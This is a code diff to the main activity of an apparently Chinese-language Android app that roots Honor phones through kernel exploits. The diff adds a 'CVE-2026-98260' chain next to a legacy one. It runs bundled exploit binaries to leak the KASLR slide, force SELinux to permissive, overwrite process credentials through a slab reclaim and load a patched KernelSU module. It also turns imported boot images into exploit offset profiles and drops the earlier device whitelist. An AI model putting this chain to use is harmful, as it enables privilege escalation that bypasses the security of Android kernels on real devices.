@@ -24,6 +24,7 @@ import android.os.IBinder;
 import android.os.Looper;
 import android.os.ParcelFileDescriptor;
 import android.os.PowerManager;
+import android.util.Log;
 import android.view.HapticFeedbackConstants;
 import android.view.Gravity;
 import android.view.View;
@@ -39,12 +40,15 @@ import android.widget.TextView;
 import android.widget.Toast;
 
 import androidx.activity.ComponentActivity;
+import androidx.activity.result.ActivityResultLauncher;
+import androidx.activity.result.contract.ActivityResultContracts;
 import androidx.compose.ui.platform.ComposeView;
 import androidx.core.content.FileProvider;
 import androidx.core.view.WindowCompat;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
@@ -59,6 +63,9 @@ import java.util.Locale;
 import java.util.Map;
 import java.util.concurrent.TimeUnit;
 
+import org.json.JSONArray;
+import org.json.JSONObject;
+
 import moe.shizuku.server.IRemoteProcess;
 import moe.shizuku.server.IShizukuService;
 import rikka.shizuku.Shizuku;
@@ -66,9 +73,15 @@ import rikka.shizuku.ShizukuBinderWrapper;
 
 public final class MainActivity extends ComponentActivity implements UiActions {
     private static final int REQ_SHIZUKU = 1001;
-    private static final String WORK = "/data/local/tmp/honor";
-    private static final String KERNEL =
+    private static volatile String WORK;
+    private static final String LEGACY_KERNEL =
             "6.18.21-android17-5-g928d1bb4f1d7-abogki542339678-4k";
+    private static final String CVE_98260_KERNEL =
+            "6.18.21-android17-5-ge186062ea75f-abogki564062290-4k";
+    private static final String CVE_98260_LEGACY_ROOT_SOCKET =
+            "/data/local/tmp/cve98260-root.sock";
+    private static final String CVE_98260_ROOT_SOCKET_PREFIX =
+            "/data/local/tmp/cve98260-root-";
     private static final String MANAGER = "me.weishu.kernelsu";
     private static final long MANAGER_VERSION_CODE = 32680;
     private static final String MANAGER_CERT_SHA256 =
@@ -78,6 +91,58 @@ public final class MainActivity extends ComponentActivity implements UiActions {
     private static final String SHIZUKU_ASSET_SHA256 =
             "6e273ab0e991c4e79bc8b1bbb9b9dd739ccac1a8712a541a214078886b7b790f";
 
+    private final ActivityResultLauncher<String[]> bootImagePicker =
+            registerForActivityResult(new ActivityResultContracts.OpenDocument(), uri -> {
+                if (uri != null) startBootImageImport(uri);
+            });
+
+    private static final class KernelProfile {
+        final String id;
+        final String kernel;
+        final long timerLink;
+        final long credLink;
+        final long slideSiteLow;
+        final long selinuxLink;
+        final long userNs;
+        final long rootUser;
+        final long groups;
+        final long ucounts;
+        final int kitimerSize;
+        final int kitimerNode;
+        final int taskCred;
+        final int credSize;
+        final int slabObjects;
+        final int slabPages;
+        final String moduleAsset;
+        final String symbolsAsset;
+
+        KernelProfile(String id, String kernel, long timerLink, long credLink,
+                      long slideSiteLow, long selinuxLink, long userNs,
+                      long rootUser, long groups, long ucounts,
+                      int kitimerSize, int kitimerNode,
+                      int taskCred, int credSize, int slabObjects, int slabPages,
+                      String moduleAsset, String symbolsAsset) {
+            this.id = id;
+            this.kernel = kernel;
+            this.timerLink = timerLink;
+            this.credLink = credLink;
+            this.slideSiteLow = slideSiteLow;
+            this.selinuxLink = selinuxLink;
+            this.userNs = userNs;
+            this.rootUser = rootUser;
+            this.groups = groups;
+            this.ucounts = ucounts;
+            this.kitimerSize = kitimerSize;
+            this.kitimerNode = kitimerNode;
+            this.taskCred = taskCred;
+            this.credSize = credSize;
+            this.slabObjects = slabObjects;
+            this.slabPages = slabPages;
+            this.moduleAsset = moduleAsset;
+            this.symbolsAsset = symbolsAsset;
+        }
+    }
+
     private final Handler ui = new Handler(Looper.getMainLooper());
     private TextView output;
     private TextView status;
@@ -85,7 +150,6 @@ public final class MainActivity extends ComponentActivity implements UiActions {
     private View statusDot;
     private TextView shizukuState;
     private TextView kernelState;
-    private TextView editionState;
     private ScrollView logScroll;
     private GlassButton run;
     private LiquidProgressView progress;
@@ -93,6 +157,7 @@ public final class MainActivity extends ComponentActivity implements UiActions {
     private UiState uiState;
     private int progressValue = 3;
     private volatile boolean busy;
+    private volatile String cve98260RootSocket;
 
     @Override
     protected void onCreate(Bundle state) {
@@ -201,23 +266,13 @@ public final class MainActivity extends ComponentActivity implements UiActions {
         deviceLabel.setLetterSpacing(0.14f);
         devicePanel.addView(deviceLabel);
         String model = Build.MODEL == null ? "UNKNOWN" : Build.MODEL.toUpperCase(Locale.ROOT);
-        TextView deviceName = text(isSupportedModel(model)
-                ? "Magic9 Pro Max" : model, 25, 0xFFF7FCFB, Typeface.BOLD);
+        TextView deviceName = text(model, 25, 0xFFF7FCFB, Typeface.BOLD);
         deviceName.setPadding(0, dp(8), 0, dp(2));
         devicePanel.addView(deviceName);
         TextView code = text(model + "  ·  " + Build.DEVICE.toUpperCase(Locale.ROOT),
                 11, 0xFF9CB1AA, Typeface.MONOSPACE);
         code.setLetterSpacing(0.06f);
         devicePanel.addView(code);
-        boolean supported = isSupportedModel(model);
-        String edition = !supported ? "UNSUPPORTED DEVICE"
-                : "WKL-AN80".equalsIgnoreCase(model)
-                        ? "1TB / WKL-AN80 PROFILE"
-                        : "WKL-AN20 PROFILE";
-        editionState = chip(edition, supported ? 0xFF82EDB8 : 0xFFFF9D9D);
-        LinearLayout.LayoutParams editionLp = new LinearLayout.LayoutParams(-2, -2);
-        editionLp.topMargin = dp(13);
-        devicePanel.addView(editionState, editionLp);
         content.addView(devicePanel);
         content.addView(space(12));
 
@@ -283,7 +338,7 @@ public final class MainActivity extends ComponentActivity implements UiActions {
         output.setLineSpacing(dp(2), 1f);
         output.setTypeface(Typeface.MONOSPACE);
         output.setPadding(0, dp(12), 0, dp(4));
-        output.setText("控制台已就绪。\nWKL-AN20 / WKL-AN80 白名单已启用。");
+        output.setText("控制台已就绪。\n默认使用 CVE-2026-98260；实际内核匹配时自动锁定。");
         logScroll.addView(output, new ScrollView.LayoutParams(-1, -2));
         LinearLayout.LayoutParams logLp =
                 new LinearLayout.LayoutParams(-1, dp(210));
@@ -376,6 +431,7 @@ public final class MainActivity extends ComponentActivity implements UiActions {
                             "公开 AIDL 通道可用，可以开始安全检查", true);
                     uiState.setShizukuState("已授权");
                 });
+                new Thread(this::refreshKernelProfile, "honor-kernel-profile").start();
             } else if (ping) {
                 ui.post(() -> {
                     uiState.setStatus("等待授权",
@@ -412,7 +468,7 @@ public final class MainActivity extends ComponentActivity implements UiActions {
                 log("Shizuku 权限已就绪。");
             }
         } catch (Throwable t) {
-            log("Shizuku 请求失败：" + t);
+            logError("Shizuku 请求失败：" + t);
         }
     }
 
@@ -428,7 +484,7 @@ public final class MainActivity extends ComponentActivity implements UiActions {
             try {
                 installBundledApk("KernelSUManager.apk");
             } catch (Throwable t) {
-                log("无法启动管理器安装器：" + t);
+                logError("无法启动管理器安装器：" + t);
             }
         }
     }
@@ -448,6 +504,41 @@ public final class MainActivity extends ComponentActivity implements UiActions {
         getWindow().getDecorView().performHapticFeedback(
                 HapticFeedbackConstants.CONFIRM);
         startPipeline();
+    }
+
+    @Override
+    public void onSelectExploit(ExploitChoice choice) {
+        if (choice == ExploitChoice.LEGACY_64560 && !uiState.getLegacyAllowed()) {
+            logError("当前实际内核不允许选择 64560。");
+            return;
+        }
+        uiState.setExploitChoice(choice);
+        log("利用链选择：" + choice.getLabel());
+    }
+
+    @Override
+    public void onImportBootImage() {
+        getWindow().getDecorView().performHapticFeedback(
+                HapticFeedbackConstants.CONFIRM);
+        bootImagePicker.launch(new String[]{"application/octet-stream", "*/*"});
+    }
+
+    private void refreshKernelProfile() {
+        try {
+            if (!Shizuku.pingBinder() || Shizuku.checkSelfPermission()
+                    != android.content.pm.PackageManager.PERMISSION_GRANTED)
+                return;
+            String kernel = probe("uname -r").trim();
+            if (kernel.isEmpty())
+                return;
+            boolean isCve98260Kernel = CVE_98260_KERNEL.equals(kernel);
+            ui.post(() -> {
+                uiState.setLegacyAllowed(!isCve98260Kernel);
+                if (isCve98260Kernel)
+                    uiState.setExploitChoice(ExploitChoice.CVE_98260);
+            });
+        } catch (Throwable ignored) {
+        }
     }
 
     @Override
@@ -517,8 +608,113 @@ public final class MainActivity extends ComponentActivity implements UiActions {
             try {
                 installBundledApk("ShizukuManager.apk");
             } catch (Throwable t) {
-                log("无法启动 Shizuku 安装器：" + t);
+                logError("无法启动 Shizuku 安装器：" + t);
             }
+        }
+    }
+
+    private void startBootImageImport(Uri uri) {
+        if (busy) return;
+        busy = true;
+        progress(4);
+        uiState.clearLogs();
+        uiState.resetStages();
+        uiState.setBusy(true);
+        setKernelState("生成配置中", true);
+        setSystemStatus("正在导入 boot.img", "解析内核并生成 98260 配置", false);
+        wakeLock.acquire(15 * 60 * 1000L);
+        new Thread(() -> importBootImage(uri), "honor-boot-import").start();
+    }
+
+    private void importBootImage(Uri uri) {
+        try {
+            stage("读取 boot.img");
+            byte[] boot = readUriBytes(uri, 512L * 1024 * 1024);
+            stage("解包内核");
+            byte[] kernel = KernelProfileGenerator.extractKernel(boot);
+            stage("解析内核符号与 BTF");
+            KernelProfileGenerator.Result result = KernelProfileGenerator.generate(kernel);
+            stage("生成 KernelSU 配置");
+            File profileRoot = new File(getFilesDir(), "profiles");
+            File directory = new File(profileRoot, result.safeId());
+            if (!directory.exists() && !directory.mkdirs())
+                throw new IllegalStateException("无法创建配置目录");
+
+            File symbolsFile = new File(directory, "syms.txt");
+            writeFileBytes(symbolsFile, result.toSymbolText().getBytes(StandardCharsets.UTF_8));
+
+            File moduleFile = new File(directory, "ksu-template.ko");
+            byte[] module = KernelProfileGenerator.patchVermagic(
+                    readAsset("ksu-template.ko"), result.kernel);
+            writeFileBytes(moduleFile, module);
+
+            JSONObject profile = new JSONObject();
+            profile.put("id", result.id);
+            profile.put("kernel", result.kernel);
+            profile.put("timer_link", hex(result.timerLink));
+            profile.put("cred_link", hex(result.credLink));
+            profile.put("slide_site_low", hex(result.slideSiteLow));
+            profile.put("selinux_link", hex(result.selinuxLink));
+            profile.put("user_ns", hex(result.userNs));
+            profile.put("root_user", hex(result.rootUser));
+            profile.put("groups", hex(result.groups));
+            profile.put("ucounts", hex(result.ucounts));
+            profile.put("kitimer_size", result.kitimerSize);
+            profile.put("kitimer_node", result.kitimerNode);
+            profile.put("task_cred", result.taskCred);
+            profile.put("cred_size", result.credSize);
+            profile.put("slab_objects", 21);
+            profile.put("slab_pages", 2);
+            profile.put("module_asset", moduleFile.getAbsolutePath());
+            profile.put("symbols_asset", symbolsFile.getAbsolutePath());
+            profile.put("vulnerable", true);
+            JSONObject audit = new JSONObject();
+            audit.put("begin_new_exec", hex(result.beginNewExec));
+            audit.put("btf_base", hex(result.btfBase));
+            audit.put("kallsyms", result.kallsymsCount);
+            profile.put("audit", audit);
+            writeFileBytes(new File(directory, "profile.json"),
+                    profile.toString(2).getBytes(StandardCharsets.UTF_8));
+
+            stage("完成");
+            ui.post(() -> uiState.completeCurrentStage());
+            progress(100);
+            setKernelState("配置可用", true);
+            setSystemStatus("配置已导入", result.kernel, true);
+        } catch (Throwable t) {
+            ui.post(() -> uiState.failCurrentStage());
+            setKernelState("配置失败", false);
+            setSystemStatus("boot.img 导入失败", String.valueOf(t.getMessage()), false);
+            logError("boot.img 导入失败：" + t);
+        } finally {
+            busy = false;
+            ui.post(() -> {
+                uiState.setBusy(false);
+                wakeLock.release();
+            });
+        }
+    }
+
+    private byte[] readUriBytes(Uri uri, long limit) throws Exception {
+        try (InputStream in = getContentResolver().openInputStream(uri)) {
+            if (in == null) throw new IllegalStateException("无法打开所选 boot.img");
+            ByteArrayOutputStream out = new ByteArrayOutputStream();
+            byte[] buffer = new byte[65536];
+            long total = 0;
+            int n;
+            while ((n = in.read(buffer)) > 0) {
+                total += n;
+                if (total > limit) throw new IllegalStateException("boot.img 超过 512 MiB");
+                out.write(buffer, 0, n);
+            }
+            return out.toByteArray();
+        }
+    }
+
+    private static void writeFileBytes(File file, byte[] data) throws Exception {
+        try (FileOutputStream out = new FileOutputStream(file)) {
+            out.write(data);
+            out.flush();
         }
     }
 
@@ -526,12 +722,28 @@ public final class MainActivity extends ComponentActivity implements UiActions {
         if (busy) return;
         busy = true;
         progress(5);
+        uiState.clearLogs();
+        uiState.resetStages();
         uiState.setBusy(true);
         uiState.setStatus("正在验证环境", "检查设备、内核与 Shizuku 状态", false);
         setKernelState("检查中", true);
         log("开始执行。完整流程可能需要 10-30 分钟，请保持屏幕开启。");
         wakeLock.acquire(30 * 60 * 1000L);
         new Thread(this::pipeline, "honor-oneclick").start();
+    }
+
+    private String probe(String command) {
+        try {
+            Process p = shellProcess(command);
+            try (OutputStream ignored = p.getOutputStream()) {
+            }
+            String out = readAll(p.getInputStream());
+            String err = readAll(p.getErrorStream());
+            p.waitFor();
+            return out + err;
+        } catch (Throwable t) {
+            return "";
+        }
     }
 
     private void pipeline() {
@@ -546,21 +758,26 @@ public final class MainActivity extends ComponentActivity implements UiActions {
             String model = shell("getprop ro.product.model").trim();
             String device = shell("getprop ro.product.device").trim();
             log("model=" + model + " device=" + device + " kernel=" + kernel);
-            if (!isSupportedModel(model)) {
-                throw new IllegalStateException("机型不在 WKL-AN20 / WKL-AN80 白名单");
-            }
-            if (!KERNEL.equals(kernel)) {
-                throw new IllegalStateException("内核指纹不在已验证列表，已安全停止");
-            }
+            log("实际内核：" + kernel + "；默认利用链为 98260。");
+
+            ExploitChoice requested = uiState.getExploitChoice();
+            boolean isCve98260Kernel = CVE_98260_KERNEL.equals(kernel);
+            ui.post(() -> {
+                uiState.setLegacyAllowed(!isCve98260Kernel);
+                if (isCve98260Kernel)
+                    uiState.setExploitChoice(ExploitChoice.CVE_98260);
+            });
+            ExploitChoice route = resolveExploit(kernel, requested);
+            if (isCve98260Kernel && requested != ExploitChoice.CVE_98260)
+                log("实际内核精确匹配 98260 目标，已强制选择 CVE-2026-98260。");
+            log("最终利用链：" + route.getLabel());
+
             cleanupHelpers();
-            setSystemStatus("正在准备提权", "设备和内核验证通过", false);
-            stage("准备 Honor 组件");
+            setSystemStatus("正在准备提权", "已选择 " + route.getLabel() + " 利用链", false);
+            stage("准备公共组件");
             prepareWorkDirectory();
-            for (String name : new String[]{"grab.sh", "forker", "t64560_v36",
-                    "t64560_v42", "perf_cred_honor", "ksu_grant", "ksud", "ksu-template.ko",
-                    "syms.txt", "ksu_grant.sh", "root_stage.sh", "kaslr_slide"}) {
-                stageAsset(name, WORK + "/" + name, "755");
-            }
+            stageCommonAssets();
+
             stage("检查已有 KernelSU");
             boolean moduleLive = shell(
                     "grep -qi kernelsu /proc/modules && echo LIVE || echo OFF").contains("LIVE");
@@ -577,68 +794,24 @@ public final class MainActivity extends ComponentActivity implements UiActions {
                 setSystemStatus("正在接管 KernelSU", "复用本次启动已加载的模块", false);
                 String grant = initializeKernelSU();
                 log(grant.trim());
-                setKernelState("运行中", true);
-                stage("完成");
-                progress(100);
-                showRootReady();
-                log("🎉 root 已就绪；已复用当前内核中的 KernelSU。");
-                launchPackage(MANAGER);
+                finishRoot(route, true);
                 return;
             }
-            stage("抓取 KASLR");
-            shell("cd " + WORK + " && sh grab.sh");
-            long slide = solveSlide();
-            long selinux = 0xffffffc08299a6f0L + slide;
-            log("slide=" + hex(slide) + " selinux=" + hex(selinux));
-            setSystemStatus("正在获取 Root", "内核地址已定位，正在建立临时权限", false);
-            stage("检查 SELinux");
-            if (!shell("getenforce").contains("Permissive")) {
-                shell("cd " + WORK + " && ./t64560_v36 0 " + hex(selinux - 7) + " 160 400 16 6000 12000 4500");
-                if (!shell("getenforce").contains("Permissive"))
-                    throw new IllegalStateException("SELinux permissive 未生效");
+
+            if (route == ExploitChoice.CVE_98260) {
+                runCve98260Pipeline(kernel);
+            } else {
+                runLegacy64560Pipeline(kernel);
             }
-            stage("生成当前 boot 的 KernelSU 模块");
-            byte[] template = readAsset("ksu-template.ko");
-            Map<String, Long> symbols = loadSymbols();
-            byte[] module = patchModule(template, symbols, slide);
-            stageBytes("ksu-patched.ko", module, "644");
-            stage("寻找 cred");
-            CredProcess cred = pickCred();
-            log("选中 cred=" + hex(cred.cred));
-            stage("设置 fsuid/fsgid");
-            shell("cd " + WORK + " && ./t64560_v36 0 " + hex(cred.cred + 0x20) + " 160 400 16 6000 12000 4500");
-            String layout = cred.lines.waitForLine("LAYOUT_DONE", 180);
-            if (layout == null) throw new IllegalStateException("cred helper 未完成布局");
-            stage("两阶段 cred 写并加载模块");
-            setSystemStatus("正在加载 KernelSU", "正在写入凭据并加载内核模块", false);
-            shell("rm -f " + WORK + "/PHASE2_DONE");
-            String write = runPhaseCommand(
-                    "cd " + WORK + " && ./t64560_v42 " + hex(cred.cred)
-                            + " 260 320 400 16 6000 12000 4500");
-            if (!write.contains("PHASE2_DONE"))
-                throw new IllegalStateException("两阶段 cred 写未完成");
-            String moduleLine = cred.lines.waitForLine("MODULE_LOADED", 45);
-            if (moduleLine == null
-                    && !shell("grep -i kernelsu /proc/modules").contains("kernelsu"))
-                throw new IllegalStateException("KernelSU 模块未加载");
-            log("KernelSU 模块加载成功");
-            setKernelState("模块已加载", true);
-            stage("初始化 KernelSU 用户态");
-            String grant = initializeKernelSU();
-            log(grant.trim());
-            setKernelState("运行中", true);
-            stage("完成");
-            progress(100);
-            showRootReady();
-            log("🎉 root 成功；KernelSU 管理器已可直接管理授权与模块。");
-            launchPackage(MANAGER);
+            finishRoot(route, false);
         } catch (Throwable t) {
             setKernelState("未就绪", false);
+            ui.post(() -> uiState.failCurrentStage());
             ui.post(() -> {
                 uiState.setStatus("提权未完成",
-                        "查看日志后重试；不确定时请重启设备", false);
+                        "查看日志；若已进入 98260 内存回收阶段，不要立即重试，先重启设备", false);
             });
-            log("✗ " + t);
+            logError("✗ " + t);
         } finally {
             cleanupHelpers();
             busy = false;
@@ -647,6 +820,372 @@ public final class MainActivity extends ComponentActivity implements UiActions {
                 wakeLock.release();
             });
         }
+    }
+
+    private ExploitChoice resolveExploit(String kernel, ExploitChoice requested) {
+        if (CVE_98260_KERNEL.equals(kernel))
+            return ExploitChoice.CVE_98260;
+        return requested == ExploitChoice.LEGACY_64560
+                ? ExploitChoice.LEGACY_64560 : ExploitChoice.CVE_98260;
+    }
+
+    private void stageCommonAssets() throws Exception {
+        stageAsset("ksu_grant", WORK + "/ksu_grant", "755");
+        stageAsset("ksu_grant.sh", WORK + "/ksu_grant.sh", "755");
+        stageAsset("root_stage.sh", WORK + "/root_stage.sh", "755");
+        stageAsset("ksud", WORK + "/ksud", "755");
+    }
+
+    private void runLegacy64560Pipeline(String kernel) throws Exception {
+        if (!LEGACY_KERNEL.equals(kernel))
+            log("[警告] 当前实际内核不是 64560 后端的已记录目标，偏移可能不匹配。");
+        stage("准备 64560 组件");
+        for (String name : new String[]{"grab.sh", "forker", "t64560_v36",
+                "t64560_v42", "perf_cred_honor", "kaslr_slide"}) {
+            stageAsset(name, WORK + "/" + name, "755");
+        }
+        stageAsset("ksu-template.ko", WORK + "/ksu-template.ko", "644");
+        stageAsset("syms.txt", WORK + "/syms.txt", "644");
+
+        stage("抓取 KASLR");
+        shell("cd " + WORK + " && sh grab.sh");
+        long slide = solveSlide();
+        long selinux = 0xffffffc08299a6f0L + slide;
+        log("slide=" + hex(slide) + " selinux=" + hex(selinux));
+        setSystemStatus("正在获取 Root", "内核地址已定位，正在建立临时权限", false);
+        stage("检查 SELinux");
+        if (!shell("getenforce").contains("Permissive")) {
+            shell("cd " + WORK + " && ./t64560_v36 0 " + hex(selinux - 7)
+                    + " 160 400 16 6000 12000 4500");
+            if (!shell("getenforce").contains("Permissive"))
+                throw new IllegalStateException("SELinux permissive 未生效");
+        }
+        stage("生成当前 boot 的 KernelSU 模块");
+        byte[] template = readAsset("ksu-template.ko");
+        Map<String, Long> symbols = loadSymbols("syms.txt");
+        byte[] module = patchModule(template, symbols, slide);
+        stageBytes("ksu-patched.ko", module, "644");
+        stage("寻找 cred");
+        CredProcess cred = pickCred();
+        log("选中 cred=" + hex(cred.cred));
+        stage("设置 fsuid/fsgid");
+        shell("cd " + WORK + " && ./t64560_v36 0 " + hex(cred.cred + 0x20)
+                + " 160 400 16 6000 12000 4500");
+        String layout = cred.lines.waitForLine("LAYOUT_DONE", 180);
+        if (layout == null) throw new IllegalStateException("cred helper 未完成布局");
+        stage("两阶段 cred 写并加载模块");
+        setSystemStatus("正在加载 KernelSU", "正在写入凭据并加载内核模块", false);
+        shell("rm -f " + WORK + "/PHASE2_DONE");
+        String write = runPhaseCommand(
+                "cd " + WORK + " && ./t64560_v42 " + hex(cred.cred)
+                        + " 260 320 400 16 6000 12000 4500");
+        if (!write.contains("PHASE2_DONE"))
+            throw new IllegalStateException("两阶段 cred 写未完成");
+        String moduleLine = cred.lines.waitForLine("MODULE_LOADED", 45);
+        if (moduleLine == null
+                && !shell("grep -i kernelsu /proc/modules").contains("kernelsu"))
+            throw new IllegalStateException("KernelSU 模块未加载");
+        log("KernelSU 模块加载成功");
+        setKernelState("模块已加载", true);
+
+        stage("初始化 KernelSU 用户态");
+        String grant = initializeKernelSU();
+        log(grant.trim());
+    }
+
+    private KernelProfile findKernelProfile(String kernel) throws Exception {
+        KernelProfile imported = findImportedProfile(kernel);
+        if (imported != null) return imported;
+
+        JSONObject root = new JSONObject(new String(
+                readAsset("exploit-profiles.json"), StandardCharsets.UTF_8));
+        JSONArray profiles = root.getJSONArray("profiles");
+        for (int i = 0; i < profiles.length(); i++) {
+            JSONObject p = profiles.getJSONObject(i);
+            if (!kernel.equals(p.getString("kernel"))) continue;
+            if (p.has("vulnerable") && !p.getBoolean("vulnerable"))
+                throw new IllegalStateException("该内核配置未通过漏洞路径检查：" + kernel);
+            return profileFromJson(p);
+        }
+        throw new IllegalStateException(
+                "没有与实际内核匹配的 98260 配置：" + kernel);
+    }
+
+    private KernelProfile findImportedProfile(String kernel) throws Exception {
+        File profiles = new File(getFilesDir(), "profiles");
+        List<File> files = new ArrayList<>();
+        collectProfileFiles(profiles, files);
+        for (File file : files) {
+            JSONObject p = new JSONObject(new String(
+                    readFileBytes(file), StandardCharsets.UTF_8));
+            if (!kernel.equals(p.getString("kernel"))) continue;
+            if (!p.optBoolean("vulnerable", false))
+                throw new IllegalStateException("导入配置未通过漏洞路径检查：" + kernel);
+            return profileFromJson(p);
+        }
+        return null;
+    }
+
+    private static void collectProfileFiles(File directory, List<File> files) {
+        File[] children = directory.listFiles();
+        if (children == null) return;
+        for (File child : children) {
+            if (child.isDirectory()) {
+                collectProfileFiles(child, files);
+            } else if (child.getName().endsWith(".json")) {
+                files.add(child);
+            }
+        }
+    }
+
+    private KernelProfile profileFromJson(JSONObject p) throws Exception {
+        return new KernelProfile(
+                p.getString("id"),
+                p.getString("kernel"),
+                Long.parseUnsignedLong(p.getString("timer_link")
+                        .replaceFirst("^0x", ""), 16),
+                Long.parseUnsignedLong(p.getString("cred_link")
+                        .replaceFirst("^0x", ""), 16),
+                Long.parseUnsignedLong(p.getString("slide_site_low")
+                        .replaceFirst("^0x", ""), 16),
+                Long.parseUnsignedLong(p.getString("selinux_link")
+                        .replaceFirst("^0x", ""), 16),
+                Long.parseUnsignedLong(p.getString("user_ns")
+                        .replaceFirst("^0x", ""), 16),
+                Long.parseUnsignedLong(p.getString("root_user")
+                        .replaceFirst("^0x", ""), 16),
+                Long.parseUnsignedLong(p.getString("groups")
+                        .replaceFirst("^0x", ""), 16),
+                Long.parseUnsignedLong(p.getString("ucounts")
+                        .replaceFirst("^0x", ""), 16),
+                p.getInt("kitimer_size"),
+                p.getInt("kitimer_node"),
+                p.getInt("task_cred"),
+                p.getInt("cred_size"),
+                p.getInt("slab_objects"),
+                p.getInt("slab_pages"),
+                p.getString("module_asset"),
+                p.getString("symbols_asset"));
+    }
+
+    private void runCve98260Pipeline(String kernel) throws Exception {
+        KernelProfile profile = findKernelProfile(kernel);
+        log("98260 内核配置：" + profile.id + " · " + kernel);
+        stage("准备 CVE-2026-98260 组件");
+        for (String name : new String[]{"cve98260_plant", "cve98260_slide",
+                "cve98260_su", "cve98260_module"}) {
+            stageAsset(name, WORK + "/" + name, "755");
+        }
+
+        String activeSocket = findReusableCve98260RootSocket();
+        boolean reuseRoot = activeSocket != null;
+        cve98260RootSocket = reuseRoot
+                ? activeSocket
+                : CVE_98260_ROOT_SOCKET_PREFIX
+                        + Long.toHexString(System.nanoTime()) + ".sock";
+        if (reuseRoot) {
+            log("发现本次启动已有的 98260 root 通道，直接复用：" + cve98260RootSocket);
+        } else {
+            log("98260 socket=" + cve98260RootSocket);
+            String parked = probe("pidof cve98260_plant 2>/dev/null").trim();
+            if (!parked.isEmpty())
+                throw new IllegalStateException(
+                        "检测到已有 98260 进程（pid " + parked + "）但 root 通道不可用；请重启设备，不要重复启动");
+            stage("CVE-2026-98260 只读预检");
+            String preflight = shell("cd " + WORK + " && ./cve98260_plant --preflight"
+                    + " --timer-link " + hex(profile.timerLink)
+                    + " --cred-link " + hex(profile.credLink)
+                                        + " --selinux-link " + hex(profile.selinuxLink)
+                    + " --user-ns " + hex(profile.userNs)
+                    + " --root-user " + hex(profile.rootUser)
+                    + " --groups " + hex(profile.groups)
+                    + " --ucounts " + hex(profile.ucounts)
+                    + " --kitimer-size " + profile.kitimerSize
+                    + " --kitimer-node " + profile.kitimerNode
+                    + " --task-cred " + profile.taskCred
+                    + " --cred-size " + profile.credSize
+                    + " --slab-objects " + profile.slabObjects
+                    + " --slab-pages " + profile.slabPages);
+            logImportantLines(preflight, "[preflight]");
+            if (!preflight.contains("[preflight] RESULT=OK"))
+                throw new IllegalStateException("98260 预检未通过，已停止，未启动内存回收");
+        }
+
+        stage("抓取 98260 KASLR");
+        String probeOut = shell("cd " + WORK + " && ./cve98260_slide"
+                + " --site-low " + hex(profile.slideSiteLow));
+        long slide = parseCve98260Slide(probeOut, profile.timerLink);
+        log("98260 slide=" + hex(slide));
+
+        stage("生成 KernelSU 模块");
+        byte[] template = readProfileResource(profile.moduleAsset);
+        Map<String, Long> symbols = loadSymbols(profile.symbolsAsset);
+        byte[] module = patchModule(template, symbols, slide);
+        stageBytes("ksu-patched.ko", module, "644");
+
+        if (!reuseRoot) {
+            stage("启动 CVE-2026-98260");
+            setSystemStatus("正在获取 Root", "98260 正在回收 timer slab，可能持续数分钟", false);
+            String start = shell("cd " + WORK
+                    + " && if ! rm -f cve98260.log '" + cve98260RootSocket
+                    + "'"
+                    + "; then echo ROOT_SOCKET_CLEAN_FAILED; exit 1; fi"
+                    + " && (PC98260_SOCK='" + cve98260RootSocket
+                    + "' nohup ./cve98260_plant --slide " + hex(slide)
+                    + " --timer-link " + hex(profile.timerLink)
+                    + " --cred-link " + hex(profile.credLink)
+                                        + " --selinux-link " + hex(profile.selinuxLink)
+                    + " --user-ns " + hex(profile.userNs)
+                    + " --root-user " + hex(profile.rootUser)
+                    + " --groups " + hex(profile.groups)
+                    + " --ucounts " + hex(profile.ucounts)
+                    + " --kitimer-size " + profile.kitimerSize
+                    + " --kitimer-node " + profile.kitimerNode
+                    + " --task-cred " + profile.taskCred
+                    + " --cred-size " + profile.credSize
+                    + " --slab-objects " + profile.slabObjects
+                    + " --slab-pages " + profile.slabPages
+                    + " > cve98260.log 2>&1 < /dev/null & echo STARTED)");
+            log(start.trim());
+            if (start.contains("ROOT_SOCKET_CLEAN_FAILED")
+                    || !start.contains("STARTED"))
+                throw new IllegalStateException(
+                        "98260 启动失败：残留 root Socket 无法清理，请重启设备后重试");
+            waitForCve98260Root();
+        }
+
+        stage("加载 KernelSU 模块");
+        boolean moduleLive = shell(
+                "grep -qi kernelsu /proc/modules && echo LIVE || echo OFF")
+                .contains("LIVE");
+        if (!moduleLive) {
+            String load = shell(cve98260SuCommand("-c '"
+                    + WORK + "/cve98260_module " + WORK + "/ksu-patched.ko'"));
+            log(load.trim());
+        } else {
+            log("KernelSU 模块已处于加载状态，跳过 finit_module。");
+        }
+        if (!waitForKernelSuModule())
+            throw new IllegalStateException("KernelSU 模块加载失败");
+        setKernelState("模块已加载", true);
+
+        // KernelSU 会把 SELinux 恢复为 Enforcing。此后的 bootstrap socket
+        // 可能不再可由 shell 连接，收尾必须只走 KernelSU 的 su 通道。
+        stage("初始化 KernelSU 用户态");
+        String grant = initializeKernelSU();
+        log(grant.trim());
+    }
+
+    private long parseCve98260Slide(String text, long timerLink) {
+        long found = 0;
+        for (String line : text.split("\\r?\\n")) {
+            int at = line.indexOf("site=");
+            if (at < 0) continue;
+            String token = line.substring(at + 5).split("\\s+")[0];
+            try {
+                long site = Long.parseUnsignedLong(
+                        token.replaceFirst("^0x", ""), 16);
+                long slide = site - timerLink;
+                if (slide > 0 && (slide & 0xfffL) == 0) {
+                    found = slide;
+                    log("slide leak: " + line.trim());
+                }
+            } catch (NumberFormatException ignored) {
+            }
+        }
+        if (found == 0)
+            throw new IllegalStateException("98260 KASLR 探针没有得到有效 site");
+        return found;
+    }
+
+    private boolean waitForKernelSuModule() throws Exception {
+        for (int i = 0; i < 20; i++) {
+            if (shell("grep -qi kernelsu /proc/modules && echo LIVE || echo OFF")
+                    .contains("LIVE"))
+                return true;
+            Thread.sleep(500);
+        }
+        return false;
+    }
+
+    private String findReusableCve98260RootSocket() throws Exception {
+        String sockets = probe("cat /proc/net/unix 2>/dev/null | tr ' ' '\\n'"
+                + " | grep '^" + CVE_98260_ROOT_SOCKET_PREFIX
+                + "' | sort -u").trim();
+        if (sockets.isEmpty())
+            return null;
+        for (String path : sockets.split("\\r?\\n")) {
+            if (!isSafeCve98260SocketPath(path)) continue;
+            String uid = probe("PC98260_SOCK='" + path + "' "
+                    + WORK + "/cve98260_su -c 'id -u' 2>/dev/null").trim();
+            if ("0".equals(uid))
+                return path;
+        }
+        throw new IllegalStateException(
+                "检测到活动中的 98260 rootd，但 root 通道不可用；请重启设备后重试");
+    }
+
